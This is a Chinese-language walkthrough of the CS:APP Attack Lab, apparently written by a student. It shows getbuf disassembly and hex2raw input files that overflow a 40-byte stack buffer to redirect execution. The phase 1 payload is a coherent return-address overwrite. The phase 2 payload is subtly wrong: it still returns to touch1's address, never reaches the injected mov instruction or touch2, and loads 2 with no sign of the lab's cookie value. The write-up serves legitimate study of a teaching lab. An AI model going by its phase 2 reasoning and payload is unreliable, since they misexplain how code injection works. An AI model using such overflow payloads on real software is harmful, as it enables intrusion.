注意，运行./rtarget或者ctarget可能有问题，加上-q即可

## attack1:

我使用的操作系统是Ubuntu 22.04版本，在这个版本上运行ctarget程序会出现Segmentation Fault。如果你用gdb调试会发现在__vfprintf_internal方法内部有问题，具体修复方法可以参考：[Fix CS:APP Attack Lab Segmentation Fault on Newest Ubuntu 22.04](https://blog.rijuyuezhu.top/posts/db646f34/)。建议使用更老的linux版本。我使用18是没问题的。

请先阅读attacklab.pdf

`hex2raw` 是一个字一个字的读，也就是一次读8个字节，但是字内部是小端，比如attack1.txt：`41 00 00 00 00 00 00 00`

执行./hex2raw < attack1.txt会输出 `A`。`./hex2raw < attack1.txt | ./ctarget -q`我们可以用这个命令执行程序

根据pdf的意思，我们首先要侵入一个程序，让它运行 `4017c0 <touch1>:` 。方法需要你知道栈的运行过程，当我们调用函数的时候，会自动的把程序的返回地址先压入栈中，然后再进入调用的函数，调用完成后返回，示意图如下：

```
[ 返回地址 ]        <--- 函数返回后，跳转到这里执行
[ buffer (x 字节) ]<--- 局部变量，用于存储用户输入
```

我们这个程序是从 `401968 <test>` 函数开始的

```asm
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
```

```asm
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

getbuf给栈分配了40个字节的空间，40个之后就是返回地址了。所以我们先随便输入40个字节，再把后面的八个字节换成touch1的地址4017C0就成功了。

输入
```
A0 00 00 00 00 00 00 00
B0 00 00 00 00 00 00 00
C0 00 00 00 00 00 00 00
D0 00 00 00 00 00 00 00
E0 00 00 00 00 00 00 00
C0 17 40 00 00 00 00 00
```

## attack2:

可能大家会有一个问题，返回地址只有8个字节，那我们需要放指令在里面怎么办。我们顺着往后加就行了。因为getbuf分配了40个字节。

attack2需要设置%rdi的值为2，然后返回就行了。

设置寄存器 `%rdi` 的值为 `2` 的汇编指令和字节表示如下：

---

### 汇编指令
```asm
mov $2, %rdi
```

---

### 字节表示（机器码）

1. 使用 **mov 指令** 加载立即数到寄存器 `%rdi`：
   - `movabs $imm64, %rdi`
   - 对应的机器码为：
     ```
     48 bf <imm64>
     ```
   - 其中：
     - `48 bf` 是 `movabs` 指令的操作码。
     - `<imm64>` 是目标值（`2`），用 64 位小端字节序表示。

   - `bf` 是 `movabs` 的专用操作码，用于指定目标寄存器为 `%rdi`。
   - 操作码中的寄存器编码是硬编码的。  
     - 在 x86-64 的指令集中，寄存器编号（Register ID）被直接嵌入操作码或操作数中。

2. 具体编码：
   - `2` 的 64 位小端表示为：`02 00 00 00 00 00 00 00`
   - 最终机器码为：
     ```
     48 bf 02 00 00 00 00 00 00 00
     ```

结果应显示类似：
```
   48 bf 02 00 00 00 00 00 00 00   mov $0x2,%rdi
```



输入
```
A0 00 00 00 00 00 00 00
B0 00 00 00 00 00 00 00
C0 00 00 00 00 00 00 00
D0 00 00 00 00 00 
48 bf 02 00 00 00 00 00 00 00  /* mov $0x2,%rdi */
C0 17 40 00 00 00 00 00
```
